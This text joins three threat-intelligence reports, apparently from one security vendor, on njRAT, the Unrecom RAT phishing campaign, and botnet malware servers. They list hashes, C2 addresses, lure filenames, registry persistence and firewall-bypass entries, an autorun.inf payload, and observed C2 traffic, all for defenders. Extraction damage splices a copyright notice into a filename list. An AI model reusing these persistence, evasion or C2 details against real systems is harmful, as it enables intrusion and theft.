Through the Command & Control ( CnC ) server software , the attacker has capabilities to create and configure the malware to spread through USB drives .
`` njRAT '' is currently leveraged by advanced threat actors in the Middle East , in particular when delivered via HTTP ( i.e .
Phishing attack or Drive - by download ) .
It has also been observed that attackers are delivering `` njRAT '' embedded in other applications ( i.e .
L517 v.0.994 Word List Generator ) , and compressed with EZIRIZ .NET
Reactor/.NET protector .
Obfuscation with the use of compressors or protectors is a technique used by attackers to prevent detection by network- based and host - based security defenses .
We have observed the majority of the attacks leveraging `` njRAT '' to be against organizations based in or focused on the Middle East region in the government , telecom , and energy sectors .
However as this is a publicly available tool it can be attained and deployed with ease regardless of location or industry .
During the analysis of `` njRAT '' , it was observed that some of the top antivirus vendors were not currently detecting some variants of this threat .
Some of the file names of carrier files or njRAT samples observed were : L517 v0.994.exe , RealUpgrade.exe , password hotmail cracker 2013.exe , elisa.exe , Crack All Games.exe , fresh cc Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use .
This document can not be modified or converted to any other electronic or machine - readable form in whole or in part without prior written approval of Fidelis Security Systems , Inc .
While we have done our best to ensure that the material found in this document is accurate , Fidelis Security Systems , Inc. makes no guarantee that the information contained herein is error free .
cvv all info 2013_txt.scr , spoolsv.exe , Hack Origin Game's.exe , Authorization form may - 2013 - 115444.scr , and Authorization.exe .
This document will provide detailed information about the njRAT 's functionality , file system indicators , network indicators , some of the campaign IDs observed , MD5 hashes , and domains .
It will also go over a detailed analysis of one of the malware variants .
The `` njRAT '' is a robust remote access trojan that once it reaches and infects the end - point , allows the attacker to have full control over the Victim system .
With this access , the attacker can start scanning other systems in the victim network to perform lateral movement .
We will start this section by performing analysis on the following `` njRAT '' sample : - Filename : Authorization.exe - MD5 : 1d3baedd747f6f9bf92c81eb9f63b34b The `` Authorization.exe '' njRAT malware was embedded and dropped in the victim system by the following file : `` Authorization form may - 2013 - 115444.scr '' ( MD5 : 63781fe1932e612c6c29225d25515111 ) .
The next section ( Indicators & Mitigation Strategies ) , will provide information about other variants of the malware obtained .
The `` Authorization.exe '' malware sample was created with version V.0.5 of this RAT .
The njRAT application was developed with VB.NET ( Visual Basic .NET
) .
When the malware connects to the Command & Control ( CnC ) server , the attacker is able to perform the following actions from the njRAT CnC server GUI : The following is a screenshot of the `` njRAT '' v.0.5 CnC GUI when a Victim system connects to it : The following `` About '' information was observed in this version ( 0.5.0 ) of the C2 server software found online : The following screenshot shows the Builder interface and default parameters : The `` Authorization.exe '' malware has keylogger functionality .
It stores the logged keystrokes in the following file : `` [ CWD ] \.tmp '' .
When the malware is dropped by the `` Authorization form may - 2013 - 115444.scr '' carrier file , the logged keystrokes are stored in : `` C : \Extracted\.tmp '' .
The IP address used by the Command & Control ( C2 ) node appears to be under an IP range owned by : `` Palestinian Internet Services , P. O .
BOX 5111 Gaza City , Palestine '' .
Variants of this malware have been observed by the community since at least 2012 .
The malware appears to be known by the community as : njRAT , MSIL / Bladabindi , and Backdoor . LV .
When the `` Authorization.exe '' malware is executed it : - Creates a copy of itself in the following locations : o % APPDATA % \msnco.exe o C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe - Tries to open the following file : [ CWD ] \ Authorization.exe.config - Entrenches in the system for persistence in the following registry locations : o HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ru n\b6554e5bcfef391ff7a7ffda58092e10 o HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\R un\b6554e5bcfef391ff7a7ffda58092e10 Makes the following modifications to the registry to bypass the Windows Firewall : o Key : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAcc ess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplic ations\List\ [ % APPDATA % ] \msnco.exe o Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe - Beacons to the following C2 node over TCP port 1177 : `` 217.66.231.245 '' The attacker tries to make sure the malware will run in the system by making the second copy into the above mentioned directory ( C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe ) o This causes the malware to execute again when the system is rebooted and re - starts the infection in the system .
Once the system is infected again , it will beacon to the C2 node .
The attacker tries to trick the user by using different icons for the malware .
Various samples were observed with MS Word and PDF icons .
The following is a screenshot of how the file will look like to a normal user : When the system is configured to show file extensions , the EXE extension is now revealed : When the malware connects to the C2 node , it will send information about the victim system , malware version , open windows , etc .
The following is the network traffic observed : The following table provides information of some of the fields observed in the network traffic : Information sent by the attacker on opened windows in the system could inform him / her of his malware being analyzed and allowed to connect to the C2 node .
For example , if Wireshark , Filemon , Regmon , and IDA are opened in the system when the analyst executes the malware , this will quickly let the attacker know that someone is performing reverse engineering of his malicious code .
The following WHOIS information was found related to the C2 node ( 217.66.231.245 ) : The `` Authorization.exe '' variant in this report appears to have been available at some point through the following URL : `` hxxp : //bongdacongdong.vn / authorization.exe '' .
The domain currently resolves to the following IP address : `` 112.213.89.144 '' , but at some point , the domain was associated with the following IP address : `` 31.170.165.90 '' .
The following information was found at Virustotal for `` 31.170.165.90 '' : - Passive DNS replication The following domains resolved to the given IP address : 2013 - 04 - 18 abilkart.p.ht 2013 - 04 - 22 alexis.id1945.com 2013 - 04 - 27 aw.nation-sim.net 2013 - 06 - 04 bongdacongdong.vn 2013 - 04 - 11 cs-viewer.ru 2013 - 06 - 26 dota2mail.hol.es 2013 - 05 - 07 download.mikroonur.tk 2013 - 06 - 27 express.vv.si 2013 - 04 - 16 forumteam.ru 2013 - 04 - 25 hs.nation-sim.net - Latest detected URLs Latest URLs hosted in this IP address detected by at least one URL scanner or malicious URL dataset : 3/38 2013 - 06 - 09 08:16:23 hxxp : //www.saldo - dobrado.id1945.com / sodexo2013/dobro.htm 2/38 2013 - 06 - 05 15:15:03 hxxp : //yandload.besaba.com/ 3/38 2013 - 06 - 04 02:08:18 hxxp : //bongdacongdong.vn / authorization.exe 4/38 2013 - 05 - 30 21:34:09 hxxp : //yandload.besaba.com / index.php ? f = rubinrot.exe 5/39 2013 - 05 - 24 17:36:28 hxxp : //indonesiancode.p.ht/ 2/36 2013 - 05 - 10 04:50:52 hxxp : //yandload.besaba.com / index.php % 3F 2/37 2013 - 04 - 30 05:06:15 hxxp : //yandload.besaba.com / index.php % 5B % 2A % 2Aqmark % 2A % 2A % 5D 2/37 2013 - 04 - 29 22:23:55 hxxp : //php6.besaba.com / install_flashplayer11x32_mssd_aih.exe 2/36 2013 - 04 - 27 09:14:33 hxxp : //aw.nation - sim.net / ips_kernel / sabre / Sabre / DAV / FS / option.php 1/36 2013 - 04 - 22 21:56:09 hxxp//alexis.id1945.com/ - First submission : 2013 - 05 - 28 at 00:12:24 File Name : Authorization.exe File Size : 110080 bytes MD5 : 1d3baedd747f6f9bf92c81eb9f63b34b SHA1 : 328c12ba3e6e99e63968b066455b7575e7ee862b PE Time : 0x5197ACE1 [ Sat May 18 16:31:29 2013 UTC ] PEID Sig : Microsoft Visual C # / Basic .NET
PEID Sig : Microsoft Visual Studio .NET
Sections ( 4 ) : Name Entropy MD5 .text
5.09 dd1ed0314f376bad9786d08b53796a67 .sdata
7.99 f92654e72b03e352178cad42896f9662 .rsrc
5.65 03e4e092203078e7957cd7c164240f3d .reloc
0.08 3f2e9251bcd17a2cb17e9202d1b100d3 The following processes were started when the `` Authorization.exe '' malware was executed : C : \Windows\System32\netsh.exe % APPDATA % \msnco.exe The following files were created when the `` Authorization.exe '' malware was executed : % APPDATA % \msnco.exe C : \WINDOWS\Prefetch\AUTHORIZATION.EXE-0AD199D6.pf C : \Documents and Settings\ % USERNAME % \Start Menu\Programs\Startup\b6554e5bcfef391ff7a7ffda58092e10.exe C : \WINDOWS\Prefetch\NETSH.EXE-085CFFDE.pf C : \WINDOWS\Prefetch\MSNCO.EXE-1616CBE8.pf [ CWD ] \.tmp ( or when created by the original dropper : `` C : \Extracted\.tmp '' ) The following registry values were set by the `` Authorization.exe '' malware when it was executed : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\b6554e5 bcfef391ff7a7ffda58092e10 [ Value : `` [ % APPDATA % ] \msnco.exe '' ..
] HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\b6554e 5bcfef391ff7a7ffda58092e10 [ Value : `` [ % APPDATA % ] \msnco.exe '' ..
] HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Para meters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\ [ % APPDATA % ] \msnco.exe [ Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe ] Indicators & Mitigation Strategies : The following three ( 3 ) tables will provide information about some of the malware observed to be njRAT itself or carrier files that once executed dropped njRAT in the victim system .
The first table contains the MD5 hash , size , domain , port , njRat version , and campaign ID .
The second table contains information about the file system artifacts ( kelogger file location , files created ) .
The third table contains information about registry key entrenchment for persistence .
Then , a list of network indicators will be provided to assist network defenders with the creation of signatures to be deployed to the sensors .
The following will present the network traffic observed when different options were selected from the `` njRAT '' C2 server GUI ( YELLOW = Data sent by C2 .
TURQUOISE = Response from Victim ) .
These artifacts will hopefully assist the research community with generation of network signatures to detect this threat : The following table provides information about some of the encoded data which is files and directories in the folder browsed .
In this case , an application called BinText ( bintext.exe ) was selected in the Attacker 's Machine .
This application was executed in the Victim 's machine .
The Victim system responded with the name of the new window opened : The other portion of the traffic between the text `` TRUNCATED BY THE EXAMINER '' is the encoded executable ( BinText ) uploaded to the Victim system .
Basically , the response from the directory listing ( date , time , file size , and file name ) is sent back to the attacker in Base64 encoded format .
The encoded data sent by the Victim system was the keystrokes collected into the keylogger file in the Victim .
The data decodes to : Fidelis XPS sensors detect the `` njRAT '' malware variants and domains observed throughout this report .
Fidelis XPS sensors detected the NJC242.exe / njRAT malware as `` Trojan . Win32.Jorik . Agent.rkp '' .
Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the Threat Actors responsible .
Fidelis XPS can detect and alert on executables such as the `` njRAT '' malware multiple layers deep inside of archive files ( i.e .
ZIP ) , or even XOR'ed inside of a weaponized MS Office document or Adobe PDF File .
The Fidelis Threat Research and Network Forensics and Incident Response teams will continue to actively monitor the ever - evolving threat landscape for the latest threats to our customers ' network security .
In the past two weeks , we have observed an increase in attack activity against the U.S. state and local government , technology , advisory services , health , and financial sectors through phishing emails with what appears to be a remote access trojan ( RAT ) known as Unrecom .
The attack has also been observed against the financial sector in Saudi Arabia and Russia .
1 As Unrecom is a comprehensive multi - platform Java - based remote access tool , currently not detected by most AntiVirus products , it presents a risk to a large number of potential victims , regardless of operating system .
The following is a screenshot of the Unrecom RAT v.2.0 ( Version in Spanish ) : Over time , various reports in the community have documented the evolution of this tool .
This evolution is to be expected , but its low detection rate , recent use this month through phishing emails campaigns against multiple sectors in the U.S. and association with past campaigns involving a variety of RATs captured our attention .
The evolution of Unrecom RAT dates from its beginnings as a tool known as Frutas RAT , subsequently branded as Adwind RAT , and now Unrecom RAT .
In 2013 , it was reported that Frutas RAT was used in phishing email campaigns against high profile 2 companies in Europe and Asia in sectors such as finance , mining , telecom , and government .
Unrecom RAT provides the attacker with full control over the compromised system , once infected .
It has some of the following capabilities : In the past , variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control ( CnC ) servers used by the Unrecom RAT in this campaign .
This document will provide information about the recent phishing campaigns observed with this RAT and some of the network indicators .
The increased threat activity against the U.S. state and local government , technology , advisory services , and health sectors in the past two weeks is of great concern to us as it is being carried through phishing emails with what appears to be a tool known as Unrecom RAT .
The phishing emails try to trick the users into thinking the emails are legitimate by attaching the RAT with the some of the following names : Payment Invoice.jar , Payment details.jar , POR # 94586.zip/POR # 94586.jar , INV # 94586.zip/INV # 94586.jar , Invitation.jar , reports-pdf.jar , US $ 25k.jar , and DBC_BANK_IMG_23456_156.jar , and lremit_Transfer_Error_Page.jar .
Some of the email message subjects observed during this campaign are : It appears that the latest version of this RAT is 3.2 and is being sold at `` unrecom [ .
] net '' for $ 500 ( Enterprise Version ) and $ 200 ( Full Version ) .
We find it interesting that on their website , the authors of this software recommend Unrecom RAT buyers to not scan created servers ( malware deployed to Victim systems ) at Virustotal nor Metascan .
This is indicative of the adaptive , counter - intelligence techniques being adopted as threat actors become aware that many security researchers use these services to gather threat intelligence .
8 Significantly , malware objects seen in previous campaigns like DarkComet and ArcomRAT have also been observed beaconing to the same CnC servers Unrecom RAT is currently using .
DarkComet is 6,7 known to be a popular RAT used in threat activity in the Middle East .
A remote access tool provides an attacker with full control over the victim system .
Once a system has been compromised , the attacker may install one or more backdoors .
These backdoors provide a persistent foothold , using a separate command and control channel ; allowing future access less likely to be correlated to the original activity .
Through its modular plugin framework , this particular tool lets the attacker obtain System Information ( e.g .
IP , OS version , memory RAM information , Java version , Computer Name , User account compromised , etc .
) , Upload & Execute additional malware , Capture Webcam , Remote Desktop , File Manager , Browser Password Recovery , Capture Microphone , Keylogger , etc .
The following will present detailed information about some of the phishing emails observed and the attached malware : The `` Invitation.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Invitation.jar '' malware beaconed to `` magnumbiz.no-ip [ .
] biz '' over port `` 1505 '' .
The `` Payment details.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Payment details.jar '' malware beaconed to `` morechedder.no-ip [ .
] org '' over port `` 100 '' .
The `` reports-pdf.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` reports-pdf.jar '' malware beaconed to `` 184.22.201 [ .
] 27 '' over port `` 3030 '' .
The `` US $ 25k.jar '' malware was sent in a phishing email that contained some of the following details : The `` US $ 25k.jar '' malware beaconed to `` toba.no-ip [ .
] biz '' over port `` 1505 '' .
The `` Payment Invoice.jar '' malware was sent in a phishing email that contained some of the following details : The `` Payment Invoice.jar '' malware beaconed to `` greengreen1.no-ip [ .
] biz '' over port `` 100 '' .
The `` INV # 94586.jar '' malware was sent in a phishing email that contained some of the following details : The `` INV # 94586.jar '' malware beaconed to `` 192.95.21 [ .
] 44 '' over port `` 1511 '' .
-­‐ Hold - transactions - pdf.jar , and verification-docx.jar The `` Hold - transactions - pdf.jar / verification - docx.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` Hold - transactions - pdf.jar / verification - docx.jar '' malware beaconed to `` 184.22.201 [ .
] 27 '' over port `` 3030 '' .
The `` DBC_BANK_IMG_23456_156.jar '' malware is a corrupted file , but it was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : The `` lremit_Transfer_Error_Page.jar '' malware was sent in a phishing email that contained some of the following details : The following is a screenshot of the email : `` Iremit Transfer Error Page '' , in the above email , has a link pointing to `` http : //radaxis [ .
] by / images / sola / httpsiremit.com.aui - remit - to - the - philippines - cheapest - remittance- service-for-pinoy-in-australi.zip '' The `` lremit_Transfer_Error_Page.jar '' malware beaconed to `` resultpage92.no-ip [ .
] biz '' over port `` 5353 '' .
One simple example of how the emails in this phishing campaign are related is that the Command and Control node ( 184.22.201 [ .
] 27 ) that the malware communicates with is shared by two separate phishing emails in this campaign , as shown in the diagram below .
Beginning at the top of the diagram and working down , on the left side of the diagram are two phishing emails , the details of which are referenced in the pages above as item numbers 2 & 3 .
Of note , these phishing emails were sent to users at two separate and unrelated organizations .
As you can see , when compared to each other , these messages appear completely unrelated , other than the fact they both contain jar files that are sophomorically `` obfuscated '' as pdf.jar files .
Note that both the subjects , `` Transfer investigation report '' and `` Confirm transactions before release '' are comparatively unique as are the senders , `` Police Department '' cmmds @ sbt.co [ .
] in and Arthur Anderson alexanderharolds @ arthurandersen [ .
] com .
In addition to the fact that the emails share no attributes , the malicious attachments are also unrelated .
Finally , and of most interest in this diagram , the central node at the bottom of the diagram , represents the Command and Control node ( 184.22.201 [ .
] 27 ) used by these two examples .
While this shared resource is noteworthy , of particular interest is that it has also been used in other campaigns .
8 On the right side of the diagram are files used in two other campaigns using the ArcomRAT and 6,7 DarkComet , The fact that they share the same command - and - control infrastructure as the UnrecomRat campaign make this central node all the more interesting .
This paper seeks to highlight this campaign targeting significant enterprises worldwide , utilizing a Java- based RAT malware that is currently detected by a small set of security tools .
We are publishing these indicators so that others in the security research community can monitor for this activity and potentially correlate against other campaigns and tools that are being investigated .
Fidelis XPS™ , the Advanced Threat Defense solution from General Dynamics Fidelis Cybersecurity Solutions detects all of the activity documented in this paper .
The Fidelis Threat Research Team will continue to follow this specific activity and actively monitor the ever - evolving threat landscape for the latest threats to our customers ' security .
1 .
Adwind RAT Rebranding , Nov 2013 : http : //www.crowdstrike.com / blog / adwind - rat- rebranding / index.html 2 .
Targeted Attacks Delivering Fruit , Aug 2013 : http : //www.symantec.com / connect / blogs / targeted- attacks - delivering - fruit 3 .
Remote Access Tool Takes Aim with Android APK Binder , Jul 2013 : http : //www.symantec.com / connect / blogs / remote - access - tool - takes - aim - android - apk - binder 4 .
Old Java RAT Updates , Includes Litecoin Plugin , Apr 2014 : http : //blog.trendmicro.com / trendlabs- security - intelligence / old - java - rat - updates - includes - litecoin - plugin/ 5 .
Cross - Platform Frutas RAT Builder and Back Door , Feb 2013 : http : //www.symantec.com / connect / blogs / cross - platform - frutas - rat - builder - and - back - door 6 .
DarkComet Analysis – Understanding the Trojan used in Syrian Uprising , Mar 2012 : http : //resources.infosecinstitute.com / darkcomet - analysis - syria/ 7 .
DarkComet RAT - It is the END ! , Jul 2012 : http : //www.symantec.com / connect / blogs / darkcomet - rat - it - end 8 .
In the recent past , a Fidelis XPS user reported seeing detections of what appeared to be botnet - related malware .
While that customer was protected , we at General Dynamics Fidelis Cybersecurity Solutions decided to take a closer look .
The analysis of the malicious code revealed that it appeared to be Andromeda but the delivery infrastructure looked interesting .
Further telemetry from our sensors showed that this server in China was also hosting and distributing many other malicious specimens .
Analysis of the data revealed a pattern in the filenames .
Our analysts used this pattern to discover other systems distributed across the globe serving up various botnet malware , so far assumed to be used in distinct campaigns but clearly related in this case : - Andromeda - Beta Bot - Neutrino Bot - NgrBot / DorkBot Analysis also showed how attackers continue to benefit from the use of globally - distributed hosting providers to perform their malicious activities .
Further , the analysis revealed how attackers are hosting and distributing identical copies of the malware from servers in different countries including China , Poland , Russia , and the United States .
For the period of time researched in this activity , we observed the following targeted sectors in the US : - Manufacturing / Biotechnology & Drugs - Professional Services / Engineering - Information Technology / Telecommunications - Government / State Note that our footprint is largely in the Enterprise space and it is possible that we 're seeing spillover from wider campaigns .
This document uncovers various servers hosting Bots and other related malware , provides a triage analysis of various pieces of malware hosted by these malicious servers , and provides indicators that network defenders can use to protect their networks .
The threat activity observed in the past weeks against various targets in our customer base has shown patterns that allowed us to discover multiple servers hosting and distributing malicious software ( Bots ) .
As it is known by the network defenders and the security community , it is important to defend against these attacks since systems infected with these malicious specimens could be used for credential theft , Distributed Denial of Service Attacks , spreading malware , lateral propagation , etc .
This is of great concern as the first stage attack continues to bypass network security defenses infecting user 's computers that beacon to malicious servers to download or create the second stage malware into the victim systems .
Some of the main Bot types of malware detected through this research include : -­‐ Andromeda Andromeda is a modular bot that downloads modules and updates from its command and control ( C & C ) server during execution .
The malware has both anti - VM and anti - reversing features .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
Andromeda bot features include : self - propagation , injection into trusted processes to hide itself , network traffic encryption , download and installation of files / malware , form grabber , keylogger , ring3 rootkit , proxy , etc .
Features like form grabber , rootkit , and proxy are delivered to the malware in the form of modules that are then loaded into the victim system after the malware makes a connection with its C & C .
It appears that in 2012 , some of the modules were sold for $ 500 ( form grabber ) , $ 300 ( Ring3 rootkit ) , and $ 200 ( keylogger ) .
-­‐ DorkBot / NgrBot DorkBot is a modified IRCBot that is very similar in features to NgrBot .
DorkBot has a loader and a module .
The bot includes the following features : process injection , hard drive wiping , etc .
Different from NgrBot , DorkBot uses modified IRC commands .
Some of the commands supported include : ! die , ! dl , ! http.inj , ! logins , ! rc , ! speed , ! ssyn , ! stop , ! up , and ! udp .
NgrBot can also be remotely controlled via Internet - Relay - Chat ( IRC ) protocol .
It has capabilities to join different IRC channels to perform various attacks according to the IRC - based commands from the C & C server .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
NgrBot features include : self - propagation ( e.g .
through USB removable drives , social networking sites , and messaging clients ) , process injection , hard drive wiping , blocking access to multiple antivirus / security vendor websites , denial of service attacks , credentials stealing ( usernames and passwords ) , download and execute file , etc .
Some of the commands supported are : ~pu , ~dw , ~http.inj , ~logins , ~rc , ~speed , ~ssyn , ~stop , and ~udp .
-­‐ Beta Bot It is said that Beta bot started out as an HTTP bot .
The Bot is also known by some security vendors as ' Trojan . Neurevt ' .
Its code is obfuscated to make it more difficult for malware reverse engineers to analyze and antivirus tools to detect .
Beta bot features include : anti - VM and anti - reversing , self - propagation , rootkit , process injection , blocking access to multiple antivirus / security vendor websites , AV - disabling , form grabbing , download and execution of files , termination of competing malware communications by terminating their processes or blocking their code injections , and denial of service .
It appears that in May 2013 , the pre - built bot could be purchase for $ 320- $ 500 , and $ 20 for variant rebuilds for those requiring configuration changes .
According to online research , Beta Bot sales are being handled by `` Lord Huron , '' although `` betamonkey '' appears to be the author .
The following image was found during online research : -­‐ Neutrino The Neutrino bot was advertised as an HTTP stress - testing tool .
It has some of the following features : anti - VM and anti - reversing / debugging , denial of service ( HTTP / TCP / UDP flood ) , keylogger , command shell , credential stealing , self - spreading , etc .
It appears at some point the bot was sold for $ 550 ( Builder ) , $ 200 ( Full set including Bot and Admin Panel ) , and $ 20 ( Update ) .
Online research revealed the following contact information for this bot : n3utrino @ kaddafi [ .
] me / n3utrino @ xmpp [ .
] jp / n3utrino.blog [ .
] com .
The following images were found during online research : The following table provides information about some of the servers hosting and distributing malware and some of the filename patterns discovered : The following table provides information about the relationship between the malicious servers , detection names by antivirus tools , and vertical market affected ( based on unique hashes and detections ) : A bot malware has features like anti - reversing , credential stealing / keystroke logging / form grabbing , DNS changer , process injection , antivirus process killing , blocking of security related websites , backdoor , and others .
They also have features to spread themselves through USB removable drives , social networking sites , and messaging clients .
In addition , they could also infiltrate the network when the victim user visits a website hosting a browser exploit .
Once the attacker gains control , the infected system could be used to launch Distributed Denial of Service attacks , spread the bot to other victims , download more advanced malware to perform lateral propagation , etc .
The attackers ( Bot Masters / Herders ) could also rent their botnets to other cybercriminals .
This section presents information about some of the servers we have observed hosting and distributing malware , filename patterns , as well as a triage analysis of various pieces of malware observed delivered by these servers - Servers observed hosting and distributing malware : - Some of the filename patterns observed : - Triage analysis of various pieces of malware observed delivered by servers mentioned in this report : ( Please note that the activity in this section has been recorded per initial file infection and not individually per file downloaded and executed by the initial malware under investigation ) o Andromeda MD5 : 036eb11a5751c77bc65006769921c8e5 This file was observed hosted in the following servers : 1 .
119.1.109 [ .
] 44/and37.exe ( China ) 2 .
121.14.212 [ .
] 184/and37.exe ( China ) 3 .
54.68.121 [ .
] 73/and37.exe ( US ) File information : The malware appears to implement anti - reversing techniques preventing its executing inside a virtual machine environment ( VME ) .
This malware is believed to be a variant from the ' Andromeda Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : a2kiaymoster14902 [ .
] com Resolved IP : 121.14.212 [ .
] 248 ( China ) POST request : /bla02/gate.php GET request : 54.69.90 [ .
] 62/and40a90.exe ( US ) File downloaded : b62391f3f7cbdea02763614f60f3930f ( msitygyd.exe ) Full path and name : C : \ProgramData\msitygyd.exe Process injection : C : \Windows\SysWOW64\msiexec.exe o Beta Bot MD5 : 9e8b203f487dfa85dd47e32b3d24e24e This file was observed hosted in the following servers : 1 .
117.21.191.47/betw9.exe ( China ) 2 .
54.191.142.124/bet4.exe ( US ) File information : The malware did not appear to implement anti - reversing techniques and properly executed inside a VME .
This malware is believed to be a variant from the ' Beta Bot ' malware family .
When the file was executed in a Windows XP system , the following activity was observed : Domain : b.9thegamejuststarted14k9 [ .
] com Resolved IP : 116.255.202 [ .
] 74 ( China ) POST request : /direct / mail / order.php ? id=9156969 GET request : 121.14.212 [ .
] 184/ng40a54.exe ( China ) File downloaded : fe8c978f05f3a83af7c8905f94f71213 ( mxbrwtqjjvk.exe ) Full path and name : % TEMP % \mxbrwtqjjvk.exe GET request : 121.14.212 [ .
] 184/and40a54.exe ( China ) File downloaded : 7599016887b4d6c0e3bc2ecda983161f ( cmqgvyqtpkh.exe ) Full path and name : % TEMP % \cmqgvyqtpkh.exe Made a copy itself to : % CommonProgramFiles % \CreativeAudio\ldhkkangs.exe Hash of file copy : 9e8b203f487dfa85dd47e32b3d24e24e Registry entrenchment : Key : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Value Name : CreativeAudio Value Data : C : \Program Files\Common Files\CreativeAudio\ldhkkangs.exe Key : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Value Name : CreativeAudio Value Data : C : \Program Files\Common Files\CreativeAudio\ldhkkangs.exe Process Injection : C : \Program Files\Internet Explorer\iexplore.exe Screenshot of the registry activity : Screenshot showing a handle of the malware in the `` iexplorer.exe '' process : o Neutrino Bot MD5 : 463f7191363d0391add327c1270d7fe6 This file was observed hosted in the following servers : 1 .
121.14.212 [ .
] 184/nut40a52.exe ( China ) 2 .
155.133.18 [ .
] 45/nut40a52.exe ( Poland ) File information : The malware appears to implement anti - reversing techniques preventing it from properly executing inside a VME .
In a bare - metal system , the malware worked properly .
This malware is believed to be a variant from the ' Neutrino Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : nutqlfkq123a10 [ .
] com Resolved IP : 121.61.118 [ .
] 140 ( China ) POST request : /newfiz3/tasks.php Data : ping=1 Server response : pong POST request : /newfiz3/tasks.php Data : getcmd=1 & uid= [ removed ] & os = Win+7+Enterprise+ ( x64 ) & av = Symantec+Endpoint+Protection & nat = yes & version=3.2.1 & serial= [ removed ] & quality=0 POST request : /newfiz3/tasks.php Data : taskexec=1 & task_id=1416470040933917 GET request : 54.69.90 [ .
] 62/330740a91.exe File downloaded : b21e4c8f73151d7b0294a3974fe44421 Full name : 330740a91.exe Made a copy itself to : % APPDATA % \Roaming\WIN - S0MT3UJUS2O\splwow64.exe Hash of file copied : 463f7191363d0391add327c1270d7fe6 Created file : C : \ProgramData\bett2f00\hemxccape.exe File hash : 9cf7d079713fdf715131e16b144d3f52 Created file : C : \ProgramData\msitygyd.exe File hash : 2983d957d4cdd9293682cfaf21147d07 Created file : % TEMP % \7403542.exe File hash : 72380a9fcf7486bb731606d4f4c13f27 Created file : % TEMP % \7395367.exe File hash : f220f0a48885bafc29b31fb7228cc4bb USB drive infection : Created file : c1fa3e4ee1e2e5b088bc657b0b5a3b8e Full path and name : [ USB_DRIVE ] \autorun.inf File contents : [ autorun ] OPEN = WinSystemKB001.exe action = Run Created file : 463f7191363d0391add327c1270d7fe6 Full path and name : [ USB_DRIVE ] \WinSystemKB001.exe Note : This is a copy of original file executed .
Registry entrenchment : Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : A38973873873 Value Data : C : \ProgramData\bett2f00\hemxccape.exe Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : splwow64.exe Value Data : % APPDATA % \Roaming\WIN - S0MT3UJUS2O\splwow64.exe Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run Value Name : 172157644 Value Data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\WerFault.exe Screenshot showing a handle of the malware in the `` WerFault.exe '' process : Screenshot of related processes running in the victim system : o Andromeda Bot MD5 : 13475d0fdba8dc7a648b57b10e8296d5 This file was observed hosted in the following servers : 1 .
117.21.191 [ .
] 47/and40a37.exe ( China ) 2 .
54.68.121 [ .
] 73/and40a37.exe ( US ) File information : The malware appears to implement anti - reversing techniques preventing it from properly executing inside a VME .
In a bare - metal system , the malware worked properly .
This malware is believed to be a variant from the ' Andromeda Bot ' malware family .
When the file was executed in a Windows 7 system , the following activity was observed : Domain : a2kiaymoster14902 [ .
] com Resolved IP : 121.14.212 [ .
] 248 ( China ) POST request : /bla02/gate.php Made a copy itself to : C : \ProgramData\msitygyd.exe Hash of file copied : 13475d0fdba8dc7a648b57b10e8296d5 Registry entrenchment : Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\ Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Key : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\ CurrentVersion\Policies\Explorer\Run Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\msiexec.exe The malware appears to have rootkit functionality .
The hidden `` WinDefend '' service points to the following DLL : `` C : \Program Files ( x86 ) \Windows Defender\mpsvc.dll '' .
The system was found to have a valid `` mpsvc.dll '' file under the `` C : \Program Files\Windows Defender\ '' directory .
The following screenshot show GMER detecting the hidden service : The following is a summary of all the domains and IPs observed during the analysis of the selected malware : o a2kiaymoster14902 [ .
] com - 121.14.212 [ .
] 248 ( China ) o 54.69.90 [ .
] 62/and40a90.exe ( US ) o b.9thegamejuststarted14k9 [ .
] com - 116.255.202 [ .
] 74 ( China ) o 121.14.212 [ .
] 184/ng40a54.exe / 121.14.212 [ .
] 184/and40a54.exe ( China ) o nutqlfkq123a10 [ .
] com - 121.61.118 [ .
] 140 ( China ) For information about hashes related to this activity , please look at the spreadsheet enclosed with this report which contains relationships between servers and hashes .
The following diagram illustrates the relationship between some of the malicious servers , malware hosted / distributed , and vertical markets : The following diagram is based on the analysis / execution of some of the malware hosted and distributed by the malicious servers .
